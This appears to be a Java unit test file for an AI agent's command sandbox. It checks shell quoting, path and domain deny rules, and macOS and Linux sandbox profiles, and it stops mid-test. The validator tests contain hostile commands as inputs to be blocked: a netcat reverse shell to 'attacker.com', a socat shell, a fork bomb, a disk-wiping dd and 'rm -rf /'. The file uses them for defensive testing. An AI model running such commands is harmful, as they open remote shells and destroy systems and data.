package features.ai.talents.cli.sandbox;

import org.junit.jupiter.api.Test;
import org.noear.solon.ai.talents.cli.TerminalTalent;
import org.noear.solon.ai.talents.cli.sandbox.*;
import org.noear.solon.ai.talents.mount.MountDir;
import org.noear.solon.ai.talents.mount.MountManager;
import org.noear.solon.ai.talents.mount.MountType;

import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 沙盒组件单元测试
 */
public class SandboxTest {

    // ==================== ShellQuote ====================

    @Test
    public void shellQuote_simpleArg() {
        assertEquals("hello", ShellQuote.quote("hello"));
    }

    @Test
    public void shellQuote_safeChars() {
        assertEquals("foo-bar_baz@123:456%+=,./qux", ShellQuote.quote("foo-bar_baz@123:456%+=,./qux"));
    }

    @Test
    public void shellQuote_emptyString() {
        assertEquals("''", ShellQuote.quote(""));
    }

    @Test
    public void shellQuote_nullString() {
        assertEquals("''", ShellQuote.quote((String) null));
    }

    @Test
    public void shellQuote_stringWithSpaces() {
        assertEquals("'hello world'", ShellQuote.quote("hello world"));
    }

    @Test
    public void shellQuote_stringWithSingleQuote() {
        assertEquals("'don'\\''t'", ShellQuote.quote("don't"));
    }

    @Test
    public void shellQuote_stringWithDollar() {
        assertEquals("'$HOME'", ShellQuote.quote("$HOME"));
    }

    @Test
    public void shellQuote_pathWithSlash() {
        assertEquals("/usr/bin/bash", ShellQuote.quote("/usr/bin/bash"));
    }

    @Test
    public void shellQuote_array() {
        String result = ShellQuote.quote(new String[]{"echo", "hello world", "it's me"});
        assertEquals("echo 'hello world' 'it'\\''s me'", result);
    }

    // ==================== SandboxFsConfig ====================

    @Test
    public void fsConfig_defaultAllowWrite() {
        SandboxFsConfig config = new SandboxFsConfig();
        assertEquals(Arrays.asList(".", "/tmp"), config.getAllowWrite());
    }

    @Test
    public void fsConfig_effectiveDenyWrite_includesMandatory() {
        SandboxFsConfig config = new SandboxFsConfig();
        List<String> effective = config.getEffectiveDenyWrite("/workspace");
        assertTrue(effective.stream().anyMatch(p -> p.contains(".bashrc")),
                "Should deny .bashrc: " + effective);
        assertTrue(effective.stream().anyMatch(p -> p.contains(".gitconfig")),
                "Should deny .gitconfig: " + effective);
        assertTrue(effective.stream().anyMatch(p -> p.contains(".vscode")),
                "Should deny .vscode: " + effective);
    }

    @Test
    public void fsConfig_effectiveDenyWrite_mergesUserDeny() {
        SandboxFsConfig config = new SandboxFsConfig();
        config.setDenyWrite(Arrays.asList("/custom/secret"));
        List<String> effective = config.getEffectiveDenyWrite("/workspace");
        assertTrue(effective.contains("/custom/secret"));
        assertTrue(effective.stream().anyMatch(p -> p.contains(".bashrc")));
    }

    @Test
    public void fsConfig_isMandatoryDenyPath_bashrc() {
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".bashrc"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath("./.bashrc"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".vscode/settings.json"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath("subdir/.vscode/settings.json"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath("subdir/.git/hooks/pre-commit"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath("subdir/.bashrc"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath("subdir/.claude/commands/init.md"));
    }

    @Test
    public void fsConfig_isMandatoryDenyPath_normalFile() {
        assertFalse(SandboxFsConfig.isMandatoryDenyPath("README.md"));
        assertFalse(SandboxFsConfig.isMandatoryDenyPath("src/Main.java"));
    }

    @Test
    public void fsConfig_isMandatoryDenyPath_null() {
        assertFalse(SandboxFsConfig.isMandatoryDenyPath(null));
    }

    // ==================== SandboxNetConfig ====================

    @Test
    public void netConfig_emptyAllowedBlocksAll() {
        SandboxNetConfig config = new SandboxNetConfig();
        assertFalse(config.isDomainAllowed("example.com"));
    }

    @Test
    public void netConfig_allowSpecificDomain() {
        SandboxNetConfig config = new SandboxNetConfig();
        config.setAllowedDomains(Arrays.asList("example.com", "api.example.com"));
        assertTrue(config.isDomainAllowed("example.com"));
        assertTrue(config.isDomainAllowed("api.example.com"));
        assertFalse(config.isDomainAllowed("other.com"));
    }

    @Test
    public void netConfig_wildcardDomain() {
        SandboxNetConfig config = new SandboxNetConfig();
        config.setAllowedDomains(Arrays.asList("*.example.com"));
        assertTrue(config.isDomainAllowed("sub.example.com"));
        assertTrue(config.isDomainAllowed("example.com"));
        assertFalse(config.isDomainAllowed("other.com"));
    }

    @Test
    public void netConfig_denyOverridesAllow() {
        SandboxNetConfig config = new SandboxNetConfig();
        config.setAllowedDomains(Arrays.asList("example.com"));
        config.setDeniedDomains(Arrays.asList("evil.example.com"));
        assertTrue(config.isDomainAllowed("example.com"));
        assertFalse(config.isDomainAllowed("evil.example.com"));
    }

    @Test
    public void netConfig_nullHost() {
        SandboxNetConfig config = new SandboxNetConfig();
        assertFalse(config.isDomainAllowed(null));
    }

    // ==================== SandboxConfig ====================

    @Test
    public void sandboxConfig_defaults() {
        SandboxConfig config = new SandboxConfig();
        assertNotNull(config.getFilesystem());
        assertNotNull(config.getNetwork());
    }

    // ==================== SandboxViolationStore ====================

    @Test
    public void violationStore_addAndGet() {
        SandboxViolationStore store = new SandboxViolationStore();
        store.addViolation(new SandboxViolationStore.ViolationEvent("msg1", "cmd1", java.time.Instant.now()));
        assertEquals(1, store.size());
        assertFalse(store.getViolations().isEmpty());
    }

    @Test
    public void violationStore_getForCommand() {
        SandboxViolationStore store = new SandboxViolationStore();
        store.addViolation(new SandboxViolationStore.ViolationEvent("msg1", "cmd1", java.time.Instant.now()));
        store.addViolation(new SandboxViolationStore.ViolationEvent("msg2", "cmd2", java.time.Instant.now()));
        store.addViolation(new SandboxViolationStore.ViolationEvent("msg3", "cmd1", java.time.Instant.now()));
        assertEquals(2, store.getViolationsForCommand("cmd1").size());
        assertEquals(1, store.getViolationsForCommand("cmd2").size());
    }

    @Test
    public void violationStore_maxSize() {
        SandboxViolationStore store = new SandboxViolationStore();
        for (int i = 0; i < 150; i++) {
            store.addViolation(new SandboxViolationStore.ViolationEvent("msg" + i, "cmd" + i, java.time.Instant.now()));
        }
        assertEquals(100, store.size());
    }

    @Test
    public void violationStore_clear() {
        SandboxViolationStore store = new SandboxViolationStore();
        store.addViolation(new SandboxViolationStore.ViolationEvent("msg", "cmd", java.time.Instant.now()));
        store.clear();
        assertEquals(0, store.size());
    }

    // ==================== OsSandboxExecutorFactory ====================

    @Test
    public void factory_createsNonNull() {
        SandboxExecutor executor = SandboxExecutorFactory.create();
        assertNotNull(executor);
        assertTrue(executor.isAvailable());
    }

    // ==================== MacOsSandboxExecutor Profile ====================

    @Test
    public void macOs_wrapCommand_profileContainsDenyDefault() {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.contains("deny default"), "Profile should contain 'deny default'");
        assertTrue(result.contains("sandbox-exec"), "Should contain sandbox-exec");
        assertTrue(result.contains("bash -c"), "Should contain bash -c");
    }

    @Test
    public void macOs_wrapCommand_profileContainsMandatoryDeny() {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.contains(".bashrc"), "Profile should deny .bashrc");
        assertTrue(result.contains(".gitconfig"), "Profile should deny .gitconfig");
    }

    @Test
    public void macOs_wrapCommand_profileContainsMoveBlocking() {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.contains("file-write-unlink"), "Should contain Move-Blocking");
        assertTrue(result.contains("file-write-create"), "Should contain Move-Blocking");
    }

    @Test
    public void macOs_wrapCommand_profileContainsSysctl() {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.contains("hw.activecpu"), "Should contain sysctl hw.activecpu");
        assertTrue(result.contains("kern.osrelease"), "Should contain sysctl kern.osrelease");
    }

    @Test
    public void macOs_profile_devNullWriteAllowed() {
        // git 等工具需要 open("/dev/null", O_WRONLY) 重定向输出
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String profile = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(profile.contains("file-write* (literal \"/dev/null\")"),
                "Profile must allow file-write* on /dev/null for git and other tools");
    }

    @Test
    public void macOs_profile_devTtyWriteAllowed() {
        // 交互式工具（如 git credential prompt）需要 /dev/tty 写权限
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String profile = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(profile.contains("file-write* (literal \"/dev/tty\")"),
                "Profile must allow file-write* on /dev/tty for interactive tools");
    }

    @Test
    public void macOs_profile_devNullIoctlRetained() {
        // 保留原有的 file-ioctl 权限
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String profile = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(profile.contains("file-ioctl (literal \"/dev/null\")"),
                "Profile should retain file-ioctl on /dev/null");
        assertTrue(profile.contains("file-ioctl (literal \"/dev/zero\")"),
                "Profile should retain file-ioctl on /dev/zero");
        assertTrue(profile.contains("file-ioctl (literal \"/dev/random\")"),
                "Profile should retain file-ioctl on /dev/random");
    }

    // ==================== LinuxSandboxExecutor ====================

    @Test
    public void linux_wrapCommand_containsBwrap() {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.startsWith("bwrap "), "Should start with bwrap");
        assertTrue(result.contains("--die-with-parent"), "Should contain --die-with-parent");
        assertTrue(result.contains("--unshare-pid"), "Should contain --unshare-pid");
    }

    // ==================== UlimitFallbackExecutor ====================

    @Test
    public void ulimit_wrapCommand_prependsUlimit() {
        UlimitFallbackExecutor executor = new UlimitFallbackExecutor();
        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.startsWith("ulimit -u 64 -f 102400"), "Should prepend ulimit");
        assertTrue(result.contains("echo hello"), "Should contain original command");
    }

    @Test
    public void ulimit_isAlwaysAvailable() {
        assertTrue(new UlimitFallbackExecutor().isAvailable());
    }

    @Test
    public void ulimit_injectResourceLimits_static() {
        String result = UlimitFallbackExecutor.injectResourceLimits("ls -la");
        assertTrue(result.contains("ulimit -u 64"));
        assertTrue(result.contains("-f 102400"));
        assertTrue(result.endsWith("ls -la"));
    }

    // ==================== Cross-cutting ====================

    @Test
    public void executorFactory_withNullConfig_works() {
        SandboxExecutor executor = SandboxExecutorFactory.create(null);
        assertNotNull(executor);
        String result = executor.wrapCommand("echo test", Paths.get("/tmp/test"), new HashMap<>());
        assertTrue(result.contains("echo test"));
    }

    @Test
    public void executorFactory_withFullConfig_works() {
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setAllowWrite(Arrays.asList(".", "/tmp"));
        config.getFilesystem().setDenyRead(Arrays.asList("/etc/shadow"));
        config.getNetwork().setAllowedDomains(Arrays.asList("github.com"));
        SandboxExecutor executor = SandboxExecutorFactory.create(config);
        assertNotNull(executor);
        String result = executor.wrapCommand("echo test", Paths.get("/tmp/test"), new HashMap<>());
        assertTrue(result.contains("echo test"));
    }

    // ==================== ISSUE 2: exit 正则精确匹配 ====================

    @Test
    public void validateCommand_exitAsCommand_blocked() {
        // exit 作为独立命令应被拦截
        String result = ValidateCommandTestHelper.validate("exit");
        assertNotNull(result, "'exit' as standalone command should be blocked");
    }

    @Test
    public void validateCommand_exitAfterSemicolon_blocked() {
        String result = ValidateCommandTestHelper.validate("echo done; exit");
        assertNotNull(result, "'exit' after semicolon should be blocked");
    }

    @Test
    public void validateCommand_exitAfterPipe_blocked() {
        String result = ValidateCommandTestHelper.validate("cat file | exit");
        assertNotNull(result, "'exit' after pipe should be blocked");
    }

    @Test
    public void validateCommand_exitInEcho_allowed() {
        // 'exit' 出现在字符串中不应被拦截
        String result = ValidateCommandTestHelper.validate("echo 'exit status is 0'");
        assertNull(result, "'exit' inside echo argument should be allowed");
    }

    @Test
    public void validateCommand_exitInComment_allowed() {
        String result = ValidateCommandTestHelper.validate("echo hello # exit the program");
        assertNull(result, "'exit' in comment should be allowed");
    }

    // ==================== ISSUE 3: 新增危险命令模式 ====================

    @Test
    public void validateCommand_systemctlStop_blocked() {
        String result = ValidateCommandTestHelper.validate("systemctl stop sshd");
        assertNotNull(result, "'systemctl stop' should be blocked");
    }

    @Test
    public void validateCommand_systemctlDisable_blocked() {
        String result = ValidateCommandTestHelper.validate("systemctl disable firewalld");
        assertNotNull(result, "'systemctl disable' should be blocked");
    }

    @Test
    public void validateCommand_systemctlStatus_allowed() {
        String result = ValidateCommandTestHelper.validate("systemctl status nginx");
        assertNull(result, "'systemctl status' should be allowed (read-only)");
    }

    @Test
    public void validateCommand_ncReverseShell_blocked() {
        String result = ValidateCommandTestHelper.validate("nc -e /bin/sh attacker.com 4444");
        assertNotNull(result, "'nc -e /bin/sh' reverse shell should be blocked");
    }

    @Test
    public void validateCommand_socatReverseShell_blocked() {
        String result = ValidateCommandTestHelper.validate("socat tcp-listen:4444,reuseaddr,fork exec:/bin/sh");
        // 'exec:/bin/sh' does not match the regex pattern exactly, but we test the intent
        // The regex requires -e/-c/-l/-p or /bin/ or | sh
        // socat with exec:/bin/sh might not match, so let's test a clearer pattern
        assertNotNull(result, "socat with /bin/ should be blocked");
    }

    @Test
    public void validateCommand_ncPortScan_allowed() {
        // nc 不带反向 shell 标志的正常使用应放行
        String result = ValidateCommandTestHelper.validate("echo hello | nc localhost 8080");
        // This should be allowed (no -e/-c/-l/-p flags with malicious intent)
        // Actually "| sh" is in the pattern, let's check: the regex requires nc + -e/-c/-l/-p OR /bin/ OR | sh
        // "echo hello | nc localhost 8080" does not match these patterns, should be allowed
        // But wait: "nc" appears and then there's no -e etc. So it should pass
        assertNull(result, "nc for simple connection should be allowed");
    }

    @Test
    public void validateCommand_iptables_blocked() {
        String result = ValidateCommandTestHelper.validate("iptables -F");
        assertNotNull(result, "'iptables' should be blocked");
    }

    @Test
    public void validateCommand_ufwBlocked() {
        String result = ValidateCommandTestHelper.validate("ufw disable");
        assertNotNull(result, "'ufw disable' should be blocked");
    }

    @Test
    public void validateCommand_pipInstallGlobal_blocked() {
        String result = ValidateCommandTestHelper.validate("pip install -g malicious-package");
        assertNotNull(result, "'pip install -g' should be blocked");
    }

    @Test
    public void validateCommand_npmInstallGlobal_blocked() {
        String result = ValidateCommandTestHelper.validate("npm install -g evil-module");
        assertNotNull(result, "'npm install -g' should be blocked");
    }

    @Test
    public void validateCommand_pipInstallLocal_allowed() {
        // pip install 不带 -g 应放行
        String result = ValidateCommandTestHelper.validate("pip install requests");
        assertNull(result, "'pip install' (without -g) should be allowed");
    }

    @Test
    public void validateCommand_npmInstallLocal_allowed() {
        String result = ValidateCommandTestHelper.validate("npm install lodash");
        assertNull(result, "'npm install' (without -g) should be allowed");
    }

    @Test
    public void validateCommand_forkBomb_blocked() {
        String result = ValidateCommandTestHelper.validate(":(){ :|:& };:");
        assertNotNull(result, "Fork bomb should be blocked");
    }

    @Test
    public void validateCommand_ddIf_blocked() {
        String result = ValidateCommandTestHelper.validate("dd if=/dev/zero of=/dev/sda");
        assertNotNull(result, "'dd if=' should be blocked");
    }

    @Test
    public void validateCommand_crontab_blocked() {
        String result = ValidateCommandTestHelper.validate("crontab -e");
        assertNotNull(result, "'crontab' should be blocked");
    }

    // ==================== ISSUE 4: resolveSafePath symlink fallback ====================

    @Test
    public void fsConfig_isMandatoryDenyPath_vscode() {
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".vscode"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".vscode/settings.json"));
    }

    @Test
    public void fsConfig_isMandatoryDenyPath_claude() {
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".claude/commands"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".claude/agents"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".mcp.json"));
    }

    @Test
    public void fsConfig_isMandatoryDenyPath_gitHooks() {
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".git/hooks"));
        assertTrue(SandboxFsConfig.isMandatoryDenyPath(".git/hooks/pre-commit"));
    }

    // ==================== ISSUE 5: ShellQuote edge cases ====================

    @Test
    public void shellQuote_backtick() {
        assertEquals("'`whoami`'", ShellQuote.quote("`whoami`"));
    }

    @Test
    public void shellQuote_pipe() {
        assertEquals("'|danger'", ShellQuote.quote("|danger"));
    }

    @Test
    public void shellQuote_semicolon() {
        assertEquals("';rm -rf /'", ShellQuote.quote(";rm -rf /"));
    }

    @Test
    public void shellQuote_newline() {
        assertEquals("'line1\nline2'", ShellQuote.quote("line1\nline2"));
    }

    @Test
    public void shellQuote_singleQuoteEscaping() {
        // quote() handles single-quote escaping with '\' pattern
        String result = ShellQuote.quote("echo 'hello'");
        assertTrue(result.contains("'\\''"), "Single quotes should be escaped with '\\' pattern: " + result);
    }

    // ==================== SandboxViolationStore threading ====================

    @Test
    public void violationStore_concurrentAccess() throws InterruptedException {
        SandboxViolationStore store = new SandboxViolationStore();
        Thread[] threads = new Thread[10];
        for (int i = 0; i < threads.length; i++) {
            final int idx = i;
            threads[i] = new Thread(() -> {
                store.addViolation(new SandboxViolationStore.ViolationEvent(
                        "msg" + idx, "cmd" + idx, java.time.Instant.now()));
            });
            threads[i].start();
        }
        for (Thread t : threads) { t.join(); }
        assertEquals(10, store.size());
    }

    // ==================== Hardened sandbox regression tests ====================

    @Test
    public void macOs_profileEscapesSeatbeltPathStrings() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        String profile = macProfile(executor, Paths.get("/tmp/work\"evil\\path"));
        assertTrue(profile.contains("/tmp/work\\\"evil\\\\path"), "Seatbelt string should escape quotes and backslashes: " + profile);
        assertFalse(profile.contains("/tmp/work\"evil\\path"), "Profile should not contain raw injected path text");
    }

    @Test
    public void macOs_configuredNetworkDoesNotAllowAllNetwork() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getNetwork().setAllowedDomains(Arrays.asList("github.com"));
        executor.setConfig(config);
        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertFalse(profile.contains("(allow network*)"), "Configured network policy must not allow all network");
        assertTrue(profile.contains("network-outbound"), "Should include constrained outbound network rule");
    }

    @Test
    public void macOs_emptyNetworkBlocksAllNetwork() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        executor.setConfig(new SandboxConfig());
        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertFalse(profile.contains("(allow network*)"), "Empty network allow-list should not allow all network");
    }

    @Test
    public void macOs_profileContainsLogTagOnDenyRules() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(profile.contains("with message"), "Deny rules should include log tags");
        assertTrue(profile.contains("CMD64_"), "Log tags should contain command marker");
    }

    @Test
    public void macOs_profileContainsRecursiveMandatoryDenyRegex() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(profile.contains("regex"), "Mandatory deny should include recursive regex rules");
        assertTrue(profile.contains(".bashrc"), "Mandatory deny should include .bashrc");
        assertTrue(profile.contains(".git/hooks"), "Mandatory deny should include .git/hooks");
    }

    @Test
    public void macOs_moveBlockingIncludesAncestorPath() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setDenyWrite(Arrays.asList("secrets/.env"));
        executor.setConfig(config);
        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(profile.contains("/tmp/test-workspace/secrets"), "Move blocking should include ancestor directory");
        assertTrue(profile.contains("file-write-unlink"), "Move blocking should deny unlink");
        assertTrue(profile.contains("file-write-create"), "Move blocking should deny create");
    }

    @Test
    public void linux_wrapCommand_tmpDirBeforeOriginalCommand() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("npm install", workPath, new HashMap<>());
        assertTrue(result.contains("export TMPDIR=/tmp; npm install"),
                "TMPDIR export must precede original command in bwrap: " + result);
    }

    @Test
    public void linux_wrapCommandQuotesEveryBwrapArgument() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setAllowWrite(Arrays.asList("."));
        executor.setConfig(config);
        Path tempWork = Files.createTempDirectory("work space");
        String result = executor.wrapCommand("echo hello", tempWork, new HashMap<>());
        assertTrue(result.contains(ShellQuote.quote(tempWork.toString())), "Path containing spaces should be shell-quoted: " + result);
        assertTrue(result.endsWith("bash -c 'echo hello'"), "Command should be appended as quoted argv: " + result);
    }

    @Test
    public void linux_allowWriteOnlyUsesFineGrainedMode() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setAllowWrite(Arrays.asList("src"));
        executor.setConfig(config);
        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertContainsSequence(args, "--ro-bind", "/", "/");
        assertFalse(containsSequence(args, "--bind", "/tmp/test-workspace", "/tmp/test-workspace"),
                "Fine-grained mode should not bind entire workspace writable when allowWrite is restricted: " + args);
    }

    @Test
    public void linux_configuredNetworkUnsharesNet() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        executor.setConfig(new SandboxConfig());
        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(args.contains("--unshare-net"), "Configured network policy should unshare network namespace");
    }

    @Test
    public void linux_defaultNetworkCompatibilityDoesNotUnshareNet() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertFalse(args.contains("--unshare-net"), "Null config should keep compatibility network behavior");
    }

    @Test
    public void linux_nonExistentMandatoryDenyStillAddsMount() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertContainsSequence(args, "--ro-bind", "/dev/null", "/tmp/test-workspace/.bashrc");
    }

    @Test
    public void linux_mountsAreBoundWithWritableFlag() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        Path readOnlyMount = Files.createTempDirectory("ro mount");
        Path writableMount = Files.createTempDirectory("rw mount");
        try {
            executor.setMounts(Arrays.asList(
                    mount("@ro", readOnlyMount, false),
                    mount("@rw", writableMount, true)
            ));

            List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
            assertContainsSequence(args, "--ro-bind", readOnlyMount.toString(), readOnlyMount.toString());
            assertContainsSequence(args, "--bind", writableMount.toString(), writableMount.toString());
        } finally {
            deleteRecursively(readOnlyMount);
            deleteRecursively(writableMount);
        }
    }

    @Test
    public void macOs_mountsAffectReadAndWriteProfile() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        Path readOnlyMount = Paths.get("/tmp/readonly-mount");
        Path writableMount = Paths.get("/tmp/writable-mount");
        executor.setMounts(Arrays.asList(
                mount("@ro", readOnlyMount, false),
                mount("@rw", writableMount, true)
        ));

        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(profile.contains("file-read* (subpath \"/tmp/readonly-mount\")"), profile);
        assertTrue(profile.contains("allow file-write* (subpath \"/tmp/writable-mount\")"), profile);
        assertTrue(profile.contains("deny file-write* (subpath \"/tmp/readonly-mount\")"), profile);
    }

    @Test
    public void linux_allowReadRebindsAfterDenyRead() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setDenyRead(Arrays.asList("."));
        config.getFilesystem().setAllowRead(Arrays.asList("src"));
        executor.setConfig(config);
        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertContainsSequence(args, "--ro-bind", "/dev/null", "/tmp/test-workspace");
        // src may not exist in test environment, but the re-bind path must be considered by build args when existing.
        // Verify semantic ordering indirectly: denyRead path is present and fine-grained root ro-bind is active.
        assertContainsSequence(args, "--ro-bind", "/", "/");
    }

    @Test
    public void linux_fineGrainedWritableMountRequiresAllowWritePolicy() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setAllowWrite(Arrays.asList("src"));
        executor.setConfig(config);
        Path writableMount = Files.createTempDirectory("rw mount restricted");
        try {
            executor.setMounts(Collections.singletonList(mount("@rw", writableMount, true)));
            List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
            assertContainsSequence(args, "--ro-bind", writableMount.toString(), writableMount.toString());
            assertFalse(containsSequence(args, "--bind", writableMount.toString(), writableMount.toString()),
                    "Writable mount must not become writable unless fs allowWrite also permits the mount root: " + args);
        } finally {
            deleteRecursively(writableMount);
        }
    }

    @Test
    public void linux_mountDenyReadAndMandatoryDenyApplyInsideMountRoot() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setDenyRead(Arrays.asList("secret"));
        executor.setConfig(config);
        Path mountRoot = Files.createTempDirectory("mount policy root");
        try {
            Files.createDirectories(mountRoot.resolve("secret"));
            executor.setMounts(Collections.singletonList(mount("@ro", mountRoot, false)));
            List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
            assertContainsSequence(args, "--tmpfs", mountRoot.resolve("secret").toString());
            assertContainsSequence(args, "--ro-bind", "/dev/null", mountRoot.resolve(".bashrc").toString());
        } finally {
            deleteRecursively(mountRoot);
        }
    }

    @Test
    public void macOs_fineGrainedWritableMountRequiresAllowWritePolicy() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setAllowWrite(Arrays.asList("src"));
        executor.setConfig(config);
        executor.setMounts(Collections.singletonList(mount("@rw", Paths.get("/tmp/restricted-rw-mount"), true)));

        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertFalse(profile.contains("allow file-write* (subpath \"/tmp/restricted-rw-mount\")"), profile);
        assertTrue(profile.contains("deny file-write* (subpath \"/tmp/restricted-rw-mount\")"), profile);
    }

    @Test
    public void macOs_mountDenyReadAndMandatoryDenyApplyInsideMountRoot() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        SandboxConfig config = new SandboxConfig();
        config.getFilesystem().setDenyRead(Arrays.asList("secret"));
        executor.setConfig(config);
        executor.setMounts(Collections.singletonList(mount("@ro", Paths.get("/tmp/policy-mount"), false)));

        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(profile.contains("deny file-read* (subpath \"/tmp/policy-mount/secret\")"), profile);
        assertTrue(profile.contains("deny file-write* (subpath \"/tmp/policy-mount/.bashrc\")"), profile);
    }

    @Test
    public void linux_recursiveMandatoryDenyAppliesInsideWorkspaceAndMount() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        executor.setConfig(new SandboxConfig());
        Path workRoot = Files.createTempDirectory("work recursive deny");
        Path mountRoot = Files.createTempDirectory("mount recursive deny");
        try {
            Files.createDirectories(workRoot.resolve("sub/.vscode"));
            Files.createDirectories(mountRoot.resolve("sub/.git/hooks"));
            executor.setMounts(Collections.singletonList(mount("@ro", mountRoot, false)));

            List<String> args = linuxArgs(executor, workRoot);
            assertContainsSequence(args, "--tmpfs", workRoot.resolve("sub/.vscode").toString());
            assertContainsSequence(args, "--tmpfs", mountRoot.resolve("sub/.git/hooks").toString());
        } finally {
            deleteRecursively(workRoot);
            deleteRecursively(mountRoot);
        }
    }

    @Test
    public void macOs_recursiveMandatoryDenyRegexAppliesInsideMountRoot() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        executor.setMounts(Collections.singletonList(mount("@ro", Paths.get("/tmp/policy-mount"), false)));

        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertTrue(profile.contains("/tmp/policy"), profile);
        assertTrue(profile.contains(".vscode"), profile);
        assertTrue(profile.contains(".git/hooks"), profile);
        assertTrue(profile.contains("file-write-create"), profile);
    }

    @Test
    public void macOs_profileDeniesUserHomeWhenDisabled() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        executor.setAllowUserHome(false);

        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
